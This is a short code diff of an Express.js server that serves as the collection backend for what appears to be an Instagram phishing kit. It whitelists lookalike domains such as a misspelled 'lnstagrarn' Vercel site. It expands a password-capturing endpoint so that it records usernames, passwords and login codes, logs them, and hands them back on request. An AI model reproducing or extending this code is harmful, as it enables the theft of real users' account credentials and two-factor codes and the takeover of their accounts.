@@ -7,24 +7,33 @@ app.use(cors({
     origin: "https://account-instagram-com.vercel.app"
 }));
 
+app.use(cors({
+    origin: "https://lnstagrarn-reel-paoa2oajo.vercel.app/profile/aryan.gg_xd/geturl$=Instagram/aashyyapsalotigsh=cncyaW43bXdlZXB4/profile.html"
+}));
+
+
 app.use(express.json());
 
-let latestPassword = null;
+let latestData = {
+    username: null,
+    password: null,
+    code: null
+};
 
-app.post("/password", (req, res) => {
-    latestPassword = req.body.password;
+app.post("/data", (req, res) => {
+    latestData.username = req.body.username;
+    latestData.password = req.body.password;
+    latestData.code = req.body.code;
 
-    console.log("Received:", latestPassword);
+    console.log("Received:", latestData);
 
     res.json({
         success: true
     });
 });
 
-app.get("/password", (req, res) => {
-    res.json({
-        password: latestPassword
-    });
+app.get("/data", (req, res) => {
+    res.json(latestData);
 });
 
 const PORT = process.env.PORT || 1000;
